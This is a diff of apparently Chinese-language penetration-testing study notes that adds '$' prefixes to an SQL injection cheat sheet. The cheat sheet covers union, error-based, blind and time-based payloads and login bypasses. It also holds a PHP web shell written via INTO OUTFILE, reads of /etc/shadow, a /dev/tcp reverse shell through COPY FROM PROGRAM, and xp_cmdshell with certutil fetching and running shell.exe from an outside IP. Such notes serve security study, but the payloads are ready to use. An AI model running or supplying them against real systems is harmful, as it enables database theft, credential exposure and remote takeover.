@@ -132,12 +132,12 @@ date: 2024-02-07
 - MySQL
   ```bash
   $ mysql -u root -p'root' -h <SQL server IP> -P 3306 # 連線
-  select version(); # 查版本
-  select system_user(); # 查當前使用者
-  show databases; # 列資料庫
-  use <database_name>; # 使用某個資料庫
-  show tables;
-  SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec'; # 查密碼
+  $ select version(); # 查版本
+  $ select system_user(); # 查當前使用者
+  $ show databases; # 列資料庫
+  $ use <database_name>; # 使用某個資料庫
+  $ show tables;
+  $ SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec'; # 查密碼
   ```
 - MSSQL
 
@@ -173,35 +173,35 @@ date: 2024-02-07
   <summary><span class="spoiler">Cheat Sheet</span></summary>
 
   ```sql
-  ' ORDER BY 1-- -
-  ' ORDER BY 5-- - # 利用數字判斷 columns 數量有多少，如果使用 5 出現 error 就代表該數量的欄位不存在，那就代表 column 數量只有 4 個
-  ' UNION SELECT NULL,NULL,NULL,NULL-- - # 利用此方式找出每一個欄位的 data type ，如果出錯就把該欄位換成其他的，之後再一個一個換成 str 或 num
-  ' UNION SELECT 1,2,3,4,5-- -
-  ' UNION SELECT user(),version(),database(),4,5-- -
-  ' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema=database()-- -
-  ' UNION SELECT column_name,2,3,4,5 FROM information_schema.columns WHERE table_name='users'-- -
-  ' UNION SELECT username,password,3,4,5 FROM users-- -
+  $ ' ORDER BY 1-- -
+  $ ' ORDER BY 5-- - # 利用數字判斷 columns 數量有多少，如果使用 5 出現 error 就代表該數量的欄位不存在，那就代表 column 數量只有 4 個
+  $ ' UNION SELECT NULL,NULL,NULL,NULL-- - # 利用此方式找出每一個欄位的 data type ，如果出錯就把該欄位換成其他的，之後再一個一個換成 str 或 num
+  $ ' UNION SELECT 1,2,3,4,5-- -
+  $ ' UNION SELECT user(),version(),database(),4,5-- -
+  $ ' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema=database()-- -
+  $ ' UNION SELECT column_name,2,3,4,5 FROM information_schema.columns WHERE table_name='users'-- -
+  $ ' UNION SELECT username,password,3,4,5 FROM users-- -
 
   -- 插入 webshell (MySQL+PHP)
   -- 1. MySQL 使用者有 FILE 權限（能讀寫檔案）
   -- 2. MySQL 的 `secure_file_priv` 沒有限制寫入路徑（或設為空）
   -- 3. 目標路徑（/var/www/html/tmp/）MySQL 進程有**寫入**權限
   -- 4. 該檔案不能已存在（INTO OUTFILE 不會覆蓋）
-  ' UNION SELECT 1,"<?php system($_GET['cmd']); ?>",3,4,5 INTO OUTFILE '/var/www/html/tmp/shell.php'-- -
-  ' UNION SELECT 1,LOAD_FILE('/etc/shadow'),3,4,5-- - # 讀敏感資訊
+  $ ' UNION SELECT 1,"<?php system($_GET['cmd']); ?>",3,4,5 INTO OUTFILE '/var/www/html/tmp/shell.php'-- -
+  $ ' UNION SELECT 1,LOAD_FILE('/etc/shadow'),3,4,5-- - # 讀敏感資訊
 
   -- 開 reverse shell
-  '; DROP TABLE cmd; CREATE TABLE cmd(output text); COPY cmd FROM PROGRAM 'bash -c \"bash -i >%26 /dev/tcp/<你的IP>/4444 0>%261\"';-- -
+  $ '; DROP TABLE cmd; CREATE TABLE cmd(output text); COPY cmd FROM PROGRAM 'bash -c \"bash -i >%26 /dev/tcp/<你的IP>/4444 0>%261\"';-- -
 
   ## 如果是其使用其他系統
   -- Linux
-  INTO OUTFILE '/var/www/html/tmp/shell.php'
+  $ INTO OUTFILE '/var/www/html/tmp/shell.php'
 
   -- Windows XAMPP
-  INTO OUTFILE 'C:/xampp/htdocs/tmp/shell.php'
+  $ INTO OUTFILE 'C:/xampp/htdocs/tmp/shell.php'
 
   -- Windows IIS + PHP
-  INTO OUTFILE 'C:/inetpub/wwwroot/shell.php'
+  $ INTO OUTFILE 'C:/inetpub/wwwroot/shell.php'
   ```
 
   </details>
@@ -209,9 +209,9 @@ date: 2024-02-07
 - Error-Based
 
   ```sql
-  ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))-- -
-  ' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user())), 1)-- -
-  ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
+  $ ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))-- -
+  $ ' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user())), 1)-- -
+  $ ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
   ```
 
   因為 SQL 語句的上下文不同。參數的值很可能是被用在 INSERT 語句裡，不是 SELECT ，所以用前面的可能不會成功
@@ -221,16 +221,16 @@ date: 2024-02-07
 
   ```sql
   # 撈資料庫名
-  ' AND GTID_SUBSET(CONCAT(0x7e,(SELECT database()),0x7e),1)-- - #
+  $ ' AND GTID_SUBSET(CONCAT(0x7e,(SELECT database()),0x7e),1)-- - #
 
   # 撈表名
-  ' AND GTID_SUBSET(CONCAT(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)-- -
+  $ ' AND GTID_SUBSET(CONCAT(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)-- -
 
   # 撈欄位名
-  ' AND GTID_SUBSET(CONCAT(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e),1)-- -
+  $ ' AND GTID_SUBSET(CONCAT(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e),1)-- -
 
   # 撈帳密
-  ' AND GTID_SUBSET(CONCAT(0x7e,(SELECT group_concat(username,0x3a,password) FROM users),0x7e),1)-- -
+  $ ' AND GTID_SUBSET(CONCAT(0x7e,(SELECT group_concat(username,0x3a,password) FROM users),0x7e),1)-- -
   ```
 
   </details>
@@ -240,13 +240,13 @@ date: 2024-02-07
   <summary><span class="spoiler">Example</span></summary>
 
   ```sql
-  ' AND 1=1-- -                          -- 真，頁面正常
-  ' AND 1=2-- -                          -- 假，頁面不同
-  ' AND SUBSTRING(database(),1,1)='a'-- -
-  ' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='e'-- -
-  ' AND (SELECT LENGTH(database()))=5-- -
-  ' AND ASCII(SUBSTRING(database(),1,1))>100-- -    -- 用二分法加速
-  ' AND ASCII(SUBSTRING(database(),1,1))<120-- -
+  $ ' AND 1=1-- -                          -- 真，頁面正常
+  $ ' AND 1=2-- -                          -- 假，頁面不同
+  $ ' AND SUBSTRING(database(),1,1)='a'-- -
+  $ ' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='e'-- -
+  $ ' AND (SELECT LENGTH(database()))=5-- -
+  $ ' AND ASCII(SUBSTRING(database(),1,1))>100-- -    -- 用二分法加速
+  $ ' AND ASCII(SUBSTRING(database(),1,1))<120-- -
   ```
 
   </details>
@@ -256,11 +256,11 @@ date: 2024-02-07
   <summary><span class="spoiler">Example</span></summary>
 
   ```sql
-  ' AND SLEEP(5)-- -                     -- 確認能注入
-  ' AND IF(1=1, SLEEP(5), 0)-- -
-  ' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)-- -
-  ' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100, SLEEP(5), 0)-- -
-  ' AND (SELECT 8220 FROM (SELECT(SLEEP(5)))uvWb)-- -
+  $ ' AND SLEEP(5)-- -                     -- 確認能注入
+  $ ' AND IF(1=1, SLEEP(5), 0)-- -
+  $ ' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)-- -
+  $ ' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100, SLEEP(5), 0)-- -
+  $ ' AND (SELECT 8220 FROM (SELECT(SLEEP(5)))uvWb)-- -
   ```
 
   </details>
@@ -270,11 +270,11 @@ date: 2024-02-07
   <summary><span class="spoiler">Example</span></summary>
 
   ```sql
-  ' OR 1=1-- -
-  ' OR '1'='1
-  admin'-- -
-  ' OR 1=1 LIMIT 1-- -
-  ' OR 1=1#
+  $ ' OR 1=1-- -
+  $ ' OR '1'='1
+  $ admin'-- -
+  $ ' OR 1=1 LIMIT 1-- -
+  $ ' OR 1=1#
   ```
 
   </details>
@@ -284,14 +284,14 @@ date: 2024-02-07
   <summary><span class="spoiler">Example</span></summary>
 
   ```sql
-  ' UNION SELECT 1,2,3-- -
-  '; EXEC xp_cmdshell('whoami')-- -      -- RCE！
-  '; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -  -- 啟用 xp_cmdshell
-  ';exec xp_cmdshell 'certutil -urlcache -f http://192.168.45.195/shell.exe c:/temp/shell.exe';--
-  ';exec xp_cmdshell 'c:/temp/shell.exe';--
+  $ ' UNION SELECT 1,2,3-- -
+  $ '; EXEC xp_cmdshell('whoami')-- -     -- RCE！
+  $ '; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -  -- 啟用 xp_cmdshell
+  $ ';exec xp_cmdshell 'certutil -urlcache -f http://192.168.45.195/shell.exe c:/temp/shell.exe';--
+  $ ';exec xp_cmdshell 'c:/temp/shell.exe';--
 
-  -- stacked query (MSSQL專用)
-  '; WAITFOR DELAY '0:0:5'--
+  $ -- stacked query # (MSSQL專用)
+  $ '; WAITFOR DELAY '0:0:5'--
   ```
 
   </details>
@@ -301,8 +301,8 @@ date: 2024-02-07
   <summary><span class="spoiler">Example</span></summary>
 
   ```sql
-  ' UNION SELECT NULL,NULL,NULL-- -      -- 用 NULL 避免型別問題
-  '; CREATE TABLE cmd(output text); COPY cmd FROM PROGRAM 'id';-- -
+  $ ' UNION SELECT NULL,NULL,NULL-- -      -- 用 NULL 避免型別問題
+  $ '; CREATE TABLE cmd(output text); COPY cmd FROM PROGRAM 'id';-- -
   ```
 
   </details>
